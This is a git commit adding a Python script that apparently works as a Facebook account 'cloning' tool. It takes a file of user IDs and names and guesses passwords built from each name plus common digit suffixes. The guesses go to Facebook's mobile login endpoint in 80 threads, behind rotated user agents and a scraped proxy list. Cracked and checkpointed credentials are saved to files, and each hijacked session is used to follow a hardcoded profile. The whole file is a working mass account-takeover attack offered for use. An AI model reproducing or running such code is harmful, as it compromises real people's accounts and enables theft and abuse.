6f657defd219803f53fc31b920753bfb77111567
SXB-BRAND <121631709+SXB-BRAND@users.noreply.github.com>
2023-01-10 20:08:24 +0500

    Add files via upload

---
+++ SSB2.py
@@ -0,0 +1,382 @@
+#!/usr/bin/python3
+
+
+#admin notes
+#ua change kr lo Jo es main add hain sab local hain ab kam nhi kr rhy
+#dont forget share and sport
+#Thank You
+import os
+try:
+    import requests
+except ImportError:
+    print('\n [✓] installing requests !...\n')
+    os.system('pip install requests')
+
+try:
+    import concurrent.futures
+except ImportError:
+    print('\n [✓] installing futures !...\n')
+    os.system('pip install futures')
+
+try:
+    import bs4
+except ImportError:
+    print('\n [✓] installing bs4 !...\n')
+    os.system('pip install bs4')
+
+import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
+from concurrent.futures import ThreadPoolExecutor as javed
+from datetime import datetime
+from bs4 import BeautifulSoup
+
+
+ct = datetime.now()
+n = ct.month
+bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
+try:
+    if n < 0 or n > 12:
+        exit()
+    nTemp = n - 1
+except ValueError:
+    exit()
+
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+op = bulan[nTemp]
+P = '\x1b[1;97m' # 
+M = '\033[1;31m' # 
+H = '\033[1;32m' # 
+K = '\x1b[1;97m' # 
+B = '\x1b[1;97m' # 
+U = '\x1b[1;97m' # 
+O = '\x1b[1;97m' # 
+N = '\x1b[0m'    # 
+my_color = [
+ P, M, H, K, B, U, O, N]
+warna = random.choice(my_color)
+data,data2={},{}
+aman,cp,salah=0,0,0
+ubahP,fuck,pwBaru=[],[],[]
+ok = []
+cp = []
+id = []
+user = []
+loop = 0
+url_lookup = "https://lookup-id.com/"
+url_mb = "https://mbasic.facebook.com"
+url_ip = "https://www.httpbin.org/ip"
+header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
+bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
+cebok = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
+done = False
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+try:
+ prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+ open('.prox.txt','w').write(prox)
+except Exception as e:
+ print('')
+prox=open('.prox.txt','r').read().splitlines()
+
+# ua Start 
+
+ugen2=[]
+ugen=[]
+
+for xd in range(5000):
+	aa='Mozilla/5.0 (Linux; U; Android'
+	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
+	c=' en-us; GT-'
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	h=random.randrange(73,100)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Mobile Safari/537.36'
+	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+	ugen.append(uaku2)
+
+for xd in range(10000):
+	a='Mozilla/5.0 (Symbian/3; Series60/'
+	b=random.randrange(1, 9)
+	c=random.randrange(1, 9)
+	d='Nokia'
+	e=random.randrange(100, 9999)
+	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
+	g=random.randrange(1, 9)
+	h=random.randrange(1, 4)
+	i=random.randrange(1, 4)
+	j=random.randrange(1, 4)
+	k='Mobile Safari/535.1'
+	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
+	ugen.append(uaku)
+
+
+	aa='Mozilla/5.0 (Linux; U; Android'
+	b=random.choice(['6','7','8','9','10','11','12'])
+	c=' en-us; GT-'
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	h=random.randrange(73,100)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Mobile Safari/537.36'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen.append(uaku2)
+
+#### ua end
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.01)
+
+logo =                                          """   \x1b[31m
+#########   ##         ## #########
+##        ## ##       ## ##        ##
+##        ##  ##     ##  ##        ##
+##        ##   ##   ##   ##        ##
+##########      ## ##    ##########
+##        ##    # ##     ##        ##
+##        ##   ##   ##   ##        ##
+##        ##  ##     ##  ##        ##
+##########  ##         ## ##########
+\x1b[32m_______________________________________
+|Author   | FBX
+|Fb Id    | FBX
+|GitHub   | FBX
+|Vol      |    0.0.1
+---------------------------
+"""
+
+
+
+
+def hasil(OK,cp):
+	if not len(OK) != 0:
+	    pass
+	if len(cp) != 0:
+	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mBXB_OK.txt' % (H, P, str(len(ok))))
+	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mBXB_CP.txt' % (H, P, str(len(cp))))
+	    input("\x1b[1;97mPress enter to back BXB Menu ")
+	    Sad_Boy()
+
+def Sad_Boy():
+
+
+
+
+        
+  
+    os.system('clear')
+    print(logo)
+    ipm = requests.get(url_ip).json()
+    todz = ''
+    IP = ipm['origin']
+    print 
+    print(' [1] Start File Cloning')
+    print(' [2] Join Group')
+    print(' [E] exit ')
+    print('')
+    _Sad_Boy___ = input(' [?] Choose option : ')
+    if _Sad_Boy___ in ('1', '01'):
+        __xxx__().Sad_Boyx(id)
+    if _Sad_Boy___ in ('2', '02'):
+        os.system('https://facebook.com/groups/347577560720737/')
+    if _Sad_Boy___ in ('E', 'ee'):
+        pass
+
+
+class __xxx__:
+    def __init__(self):
+        self.id = []
+    def Sad_Boyx(self,id):
+  
+       
+      
+         
+            
+
+        os.system("clear")
+        print(logo)
+        self.cnt = input('Put File Name : ')
+        self.id = open(self.cnt).read().splitlines()
+        os.system('clear')
+        print(logo)
+        print("")
+        ___worldwide___ = ('y')
+        if ___worldwide___ in ('yes','Yes','Y', 'y'):
+            self.__pler__()
+        else:
+            print(' [!] Choose Correct One');
+            self.Sad_Boyx(id)
+    def __metode__(self, user, __chi__, cebok):
+        global ok,cp,loop,princp
+        sys.stdout.write(f"\r \x1b[1;97m[BXB] {loop}|{len(self.id)} [OK][{len(ok)}]")
+        sys.stdout.flush()
+        try:
+            for pw in __chi__:
+                pw = pw.lower()
+                pro = random.choice(ugen)
+                session=requests.Session()
+                header = {}
+                r = session.get(f"https://m.facebook.com", headers=header)
+                das = {
+                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
+                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
+                    "uid":user,
+                    "flow":"login_no_pin",
+                    "pass":pw,
+                    "next":"https://developers.facebook.com/tools/debug/accesstoken/"
+                }
+                header1 = {
+               'authority': 'm.facebook.com',
+                'method': 'GET',
+                'scheme': 'https',
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+                'accept-language': 'en-US,en;q=0.9',
+                'cache-control': 'max-age=0',
+                'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'sec-fetch-dest': 'document',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'none',
+                'sec-fetch-user': '?1',
+                'upgrade-insecure-requests': '1',
+                'user-agent':pro}
+                po = session.post(f"https://{cebok}/login/device-based/validate-password/?shbl=0", data = das, headers = header1, allow_redirects = False)
+                if 'c_user' in session.cookies.get_dict():
+                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                    print(f"\r{H} [BXB-OK] {user} | {pw}")
+                    wrt = '%s|%s' % (user,pw)
+                    ok.append(wrt)
+                    open('BXB_OK.txt' , 'a').write('%s\n' % wrt)
+                    self.follow(session,coki)
+                    break
+                elif 'checkpoint' in session.cookies.get_dict():
+                    try:
+                        tokenz = open('.token.txt').read()
+                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
+                        month, day, year = cp_ttl.split('/')
+                        month = bulan_ttl[month]
+                        print('\r%s [BXB-CP] %s | %s ' % (M, user, pw))
+                        wrt = '%s|%s' % (user,pw)
+                        cp.append(wrt)
+                        open('BXB_CP.txt' , 'a').write('%s\n' % wrt)
+                        break
+                    except (KeyError, IOError):
+                        month = ''
+                        day   = ''
+                        year  = ''
+                    except:
+                        pass
+                    print('\r%s [BXB-CP] %s | %s ' % (M, user, pw))
+                    wrt = '%s|%s' % (user,pw)
+                    cp.append(wrt)
+                    open('BXB_CP.txt' , 'a').write('%s\n' % wrt)
+                    break
+                else:
+                    continue
+            loop+=1
+        except:
+            self.__metode__(user, pw, cebok)
+
+    def follow(self, session, coki):
+        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100013655833793', cookies={'cookie': coki}).text, 'html.parser')
+        get = r.find('a', string='Ikuti').get('href')
+        session.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
+
+    def __pler__(self):
+        print('[1] LOW AUTO METHOD')
+        print('[2] BEST METHOD')
+        chi = input('\n [?] Choose: ')
+        if chi == '':
+            print('\nSelect Correct One')
+            self.__pler__()
+        elif chi in ('1', '01'):
+            os.system("clear")
+            print(logo)
+            print(47*"-")
+            print('\033[1;33m Total IDs : %s ' % len(self.id))
+            print('\033[1;33m Please Wait...')
+            print(47*"-")
+            with javed(max_workers=80) as bxbworld:
+                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
+                    try:
+                        uid, name = zsb.split('|')
+                        xz = name.split(' ')
+                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
+                            pwx = [name, xz[0]+"123", xz[0]+"786", xz[1]+"12345", xz[0]+"1234"]
+                        else:
+                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
+                            pwx = ["786786"]
+                            pwx = ["112233"]
+                            pwx = ["123456"]
+                            pwx = ["123456789"]
+                        bxbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
+                    except:
+                        pass
+            hasil(ok,cp)
+        elif chi in ('2', '02'):
+            os.system("clear")
+            print(logo)
+            print("\033[1;37m\rEnter Last Name Digits\033[1;37m\n")
+            p1 = input('  Name + 1 : ')
+            p2 = input('  Name + 2 : ')
+            p3 = input('  Name + 3 : ')
+            p4 = input('  Name + 4 : ')
+            os.system("clear")
+            print(logo)
+
+            print(47*"-")
+            print('\033[1;33m Total IDs : %s ' % len(self.id))
+            print('\033[1;33m Please Wait...')
+            print(47*"-")
+            with javed(max_workers=80) as bxbworld:
+                for zsb in self.id: # Yo Ndak Tau Kok Tanya Saia
+                    try:
+                        uid, name = zsb.split('|')
+                        uid, name + "1234567"
+                        xz = name.split(' ')
+                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
+                            pwx = [name, xz[0]+"123", xz[0]+"786", xz[1]+"1234",  xz[0]+"12345"]
+                            pwx = [name, xz +"112233" or "1234" or "786" or "0000"]
+                            pwx = [name, xz, "786" "112233" "1234" "12345" "999" "111" "12"]
+                        else:
+                            pwx = [name, xz[0]+"123", xz[0]+"786", xz[1], xz[0]+"12345"]
+                            pwx = ["786786"]
+                            pwx = ["123456"]
+                            pwx = ["123456789"]
+                        bxbworld.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
+                    except:
+                        pass
+            hasil(ok,cp)
+        else:
+            print('\n Select Valid One')
+            self.__pler__()
+
+class load:
+    def __init__(self):
+        _ = ''
+        __ = int('30')
+        ___ = int('0')
+        __ -= 1
+        ___ += 1
+        for t in range(int("1")):
+            print('\r Please Wait ....')
+            sys.stdout.flush()
+            time.sleep(0.1)
+        print('\n')
+
+Sad_Boy()
